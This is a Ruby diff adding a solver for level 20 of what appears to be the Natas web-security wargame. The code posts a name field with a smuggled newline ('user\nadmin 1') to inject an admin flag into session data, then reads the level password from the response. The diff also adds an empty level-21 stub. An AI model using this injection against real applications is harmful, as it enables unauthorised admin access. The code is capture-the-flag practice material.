@@ -617,4 +617,20 @@ end
 # Level 20
 class NatasLevel20 < NatasLevelBase
   LEVEL = 20
+  PAGE = '/'
+  PAYLOAD = "user\nadmin 1"
+
+  def exec
+    response = post(PAGE, {}, { 'name' => PAYLOAD })
+    data = get(PAGE, { 'Cookie' => response["Set-Cookie"] }).body
+    match = %r(Password: (\w{32})</pre>).match(data)
+    not_found unless match
+    found(match[1])
+  end
+end
+
+##
+# Level 21
+class NatasLevel21 < NatasLevelBase
+  LEVEL = 21
 end
